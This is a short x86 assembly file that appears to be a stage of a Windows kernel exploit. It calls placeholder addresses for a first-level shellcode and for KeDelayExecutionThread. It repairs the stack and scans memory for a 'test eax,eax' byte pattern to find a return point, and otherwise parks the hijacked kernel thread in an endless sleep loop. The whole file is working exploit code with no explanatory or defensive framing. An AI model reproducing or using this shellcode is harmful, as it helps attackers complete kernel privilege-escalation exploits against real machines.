use32

	push   esp
	mov    eax, 0xAAAAAAAA ; Level1 Shellcode
	call   eax
	pop	   esp
	mov	   ebp, esp
	mov    eax, 0xBBBBBBBB ; fixSize
	add	   ebp, eax
	push   dword [ebp + 4]
	call   sub_48
	cmp	   eax, 0
	jz	   loc_20
	push   eax
	xor	   eax, eax
	retn
loc_20:
	push   ebp
	mov	   ebp, esp
	sub	   esp, 8
	mov	   dword [ebp - 8], 0FFE91CA0h
	mov	   dword [ebp - 4], 0FFFFFFFFh
	lea	   edx, [ebp - 8]
	push   edx
	push   0
	push   0
	mov	   eax, 0xCCCCCCCC ; KeDelayExecutionThread
	call   eax
	mov	   esp, ebp
	pop	   ebp
	jmp	   loc_20

sub_48:
	push   ebp
	mov	   ebp, esp
	push   ecx
	mov	   eax, [ebp + 8]
	mov	   ecx, [ebp + 8]
	add	   ecx, [eax - 4]
	mov	   [ebp + 8], ecx
	mov	   dword [ebp - 4], 0
	jmp	   loc_6A
loc_61:
	mov	   edx, [ebp - 4]
	add	   edx, 1
	mov	   [ebp - 4], edx
loc_6A:
	cmp	   dword [ebp - 4], 0x500
	jnb	   loc_90
	mov	   eax, [ebp + 8]
	inc	   eax
	mov	   [ebp + 8], eax
	movsx  eax, word [eax]
	and	   eax, 0xFFFF
	cmp	   eax, 0xC085
	jnz	   loc_8E
	mov	   eax, [ebp + 8]
	jmp	   loc_92
loc_8E:
	jmp	   loc_61
loc_90:
	xor	   eax, eax
loc_92:
	mov	   esp, ebp
	pop	   ebp
	retn   4